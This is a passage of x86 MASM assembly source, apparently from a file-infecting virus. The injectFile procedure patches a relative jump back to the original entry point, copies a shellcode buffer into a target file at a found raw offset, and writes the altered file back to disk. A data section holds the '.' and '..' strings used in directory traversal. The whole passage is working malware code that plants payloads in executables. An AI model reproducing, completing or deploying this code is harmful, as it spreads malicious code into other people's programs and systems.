    ; We compute rel32 as 32-bit (low dword only)
    mov     eax, newEntryRVA
    add     eax, ecx
    add     eax, 5
    mov     edx, dword ptr origEntryVA
    sub     edx, eax
    mov     byte ptr [shellBuffer+ecx], 0E9h
    mov     [shellBuffer+ecx+1], edx
    ; done

blob_ready:
    ; ------------------------------------------------------------------
    ; 14. Copy shellBuffer into buffer+rawOffsetFound
    ; ------------------------------------------------------------------
    mov     eax, rawOffsetFound
    mov     edx, buffer
    add     edx, eax
    mov     ecx, blobSize
    mov     esi, shellBuffer
    rep movsb
    ; free shellBuffer
    INVOKE GlobalFree, shellBuffer

    ; ------------------------------------------------------------------
    ; 15. Write buffer back to file
    ; ------------------------------------------------------------------
    INVOKE SetFilePointer, hFile, 0, NULL, FILE_BEGIN
    INVOKE SetEndOfFile, hFile
    INVOKE WriteFile, hFile, buffer, fileSize, ADDR bytesRead, NULL
    INVOKE CloseHandle, hFile

    ; free buffer
    INVOKE GlobalFree, buffer

    mov     eax, 0
    ret

free_and_skip:
    INVOKE CloseHandle, hFile
    INVOKE GlobalFree, buffer
    mov     eax, 2
    ret

free_and_error:
    INVOKE CloseHandle, hFile
    INVOKE GlobalFree, buffer
    mov     eax, 1
    ret

inj_skip:
    mov     eax, 2
    ret

inj_error:
    INVOKE CloseHandle, hFile
    mov     eax, 1
    ret

injectFile ENDP

; --------------------------------------------------------------------------
; Data for comparison of "." and ".."
; --------------------------------------------------------------------------
.data
szDot    BYTE ".",0
szDotDot BYTE "..",0

end start
